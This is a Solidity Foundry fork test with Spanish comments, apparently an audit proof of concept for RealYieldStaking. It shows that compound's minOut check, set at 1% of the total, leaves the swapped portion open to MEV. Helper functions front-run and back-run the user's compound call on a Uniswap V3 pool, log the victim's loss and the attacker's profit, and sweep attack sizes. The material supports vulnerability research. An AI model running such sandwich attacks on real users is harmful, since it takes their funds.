// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {IERC20} from "oz/token/ERC20/IERC20.sol";
import {RealYieldStaking} from "../../src/RealYieldStaking.sol";
import {IUniswapV3PoolLike} from "../../src/interfaces/External.sol";
import {ForkBase} from "../ForkBase.sol";

/// PoC: minOut cubre n + bought, asi que con un minOut "total * (1 - 1%)" la parte swapeada queda casi sin piso.
contract V_SwapMevMinOutCoversUnswapped is ForkBase {
    address atk;

    function _atkBuyNlyra(uint256 wethIn) internal returns (uint256 got) {
        deal(address(WETH), address(this), WETH.balanceOf(address(this)) + wethIn);
        (, int256 a1) = IUniswapV3PoolLike(POOL_NLYRA).swap(address(this), true, int256(wethIn), 4295128740, "");
        got = uint256(-a1);
    }

    function _atkSellNlyra(uint256 nIn) internal returns (uint256 got) {
        (int256 a0,) = IUniswapV3PoolLike(POOL_NLYRA).swap(
            address(this), false, int256(nIn), 1461446703485210103287273052203988822378723970341, ""
        );
        got = uint256(-a0);
    }

    function _setupSkewed(uint256 donation) internal returns (uint256 ew, uint256 en) {
        _stake(alice, 1_000_000e18, 0);
        _stake(bob, 2_000_000e18, 2);
        // donacion de NLYRA directa al staking: entra al stream (rollover/donaciones incluidas por diseno)
        if (donation != 0) _giveNlyra(address(st), donation);
        _tradeAndHarvest();
        vm.warp(vm.getBlockTimestamp() + 7 days);
        (ew, en) = st.earned(alice);
    }

    function _quoteCompound() internal returns (uint256 bought) {
        uint256 snap = vm.snapshotState();
        (, uint256 en) = st.earned(alice);
        vm.prank(alice);
        st.compound(0, 0, type(uint256).max);
        // total agregado sin bonus (bonusReserve=0 aca) - premio NLYRA = comprado
        (,,,, uint256 ts,,) = st.rewardInfo();
        ts; // unused
        vm.revertToState(snap);
        // recalcular via staticcall-like snapshot: usar evento no hace falta, usamos balance del pool
        snap = vm.snapshotState();
        uint256 before = NLYRA.balanceOf(POOL_NLYRA);
        vm.prank(alice);
        uint256 added = st.compound(0, 0, type(uint256).max);
        bought = before - NLYRA.balanceOf(POOL_NLYRA);
        assertEq(added, en + bought);
        vm.revertToState(snap);
    }

    function _run(uint256 donation, uint256 atkWeth) internal {
        (uint256 ew, uint256 en) = _setupSkewed(donation);
        uint256 q = _quoteCompound();
        emit log_named_uint("earned WETH w", ew);
        emit log_named_uint("earned NLYRA n", en);
        emit log_named_uint("quote(w) in NLYRA", q);
        uint256 minOutDesk = ((en + q) * 99) / 100; // frontend ingenuo: 1% sobre el total
        uint256 minOutFixed = en + (q * 99) / 100; // formula correcta: 1% solo sobre la parte swapeada
        emit log_named_uint("slippage budget (NLYRA)", (en + q) - minOutDesk);

        // sandwich: el atacante compra NLYRA antes
        uint256 atkGot = _atkBuyNlyra(atkWeth);

        // con el minOut correcto la tx del usuario revierte
        uint256 snap = vm.snapshotState();
        vm.prank(alice);
        vm.expectRevert();
        st.compound(minOutFixed, 0, type(uint256).max);
        vm.revertToState(snap);

        // con el minOut ingenuo pasa
        uint256 poolBefore = NLYRA.balanceOf(POOL_NLYRA);
        vm.prank(alice);
        uint256 added = st.compound(minOutDesk, 0, type(uint256).max);
        uint256 bought = poolBefore - NLYRA.balanceOf(POOL_NLYRA);
        emit log_named_uint("bought under attack", bought);
        emit log_named_uint("user loss in NLYRA", q - bought);
        emit log_named_uint("loss bps of swapped part", ((q - bought) * 10_000) / q);
        assertEq(added, en + bought);
        assertGe(added, minOutDesk);

        // backrun
        uint256 wethBack = _atkSellNlyra(atkGot);
        emit log_named_uint("atk WETH in", atkWeth);
        emit log_named_uint("atk WETH out", wethBack);
        if (wethBack > atkWeth) emit log_named_uint("atk PROFIT wei", wethBack - atkWeth);
        else emit log_named_uint("atk LOSS wei", atkWeth - wethBack);
    }

    /// premios naturales (sin donacion): ver cuanto presupuesto le queda a la parte swapeada
    function test_poc_naturalRatio() public {
        _setupSkewed(0);
        (uint256 ew, uint256 en) = st.earned(alice);
        uint256 q = _quoteCompound();
        emit log_named_uint("earned WETH w", ew);
        emit log_named_uint("earned NLYRA n", en);
        emit log_named_uint("quote(w) in NLYRA", q);
        emit log_named_uint("n / quote(w) x100", (en * 100) / q);
        emit log_named_uint("effective slippage on swap (bps) for 1% total", ((en + q) * 100) / q);
    }

    /// n muy grande frente a w: el 1% total supera todo el swap
    /// barrido: con que tamano de frontrun el atacante gana algo? (pool 1%: paga ~2% ida y vuelta)
    function test_v_sandwich_profit_scan() public {
        (uint256 ew,) = _setupSkewed(50_000_000e18);
        uint256[6] memory sizes = [uint256(0.0005 ether), 0.002 ether, 0.01 ether, 0.05 ether, 0.2 ether, 1 ether];
        int256 best = type(int256).min;
        for (uint256 i; i < sizes.length; ++i) {
            uint256 snap = vm.snapshotState();
            uint256 got = _atkBuyNlyra(sizes[i]);
            vm.prank(alice);
            st.compound(0, 0, type(uint256).max); // victima SIN piso alguno (peor caso posible)
            uint256 back = _atkSellNlyra(got);
            int256 pnl = int256(back) - int256(sizes[i]);
            emit log_named_uint("atk size wei", sizes[i]);
            emit log_named_int("atk pnl wei", pnl);
            if (pnl > best) best = pnl;
            vm.revertToState(snap);
        }
        emit log_named_uint("victim WETH swapped", ew);
        emit log_named_int("best atk pnl wei", best);
        assertLt(best, 0, "sandwich rentable");
    }

    function test_poc_skewed_sandwich_bigger() public {
        _run(50_000_000e18, 0.5 ether);
    }
}
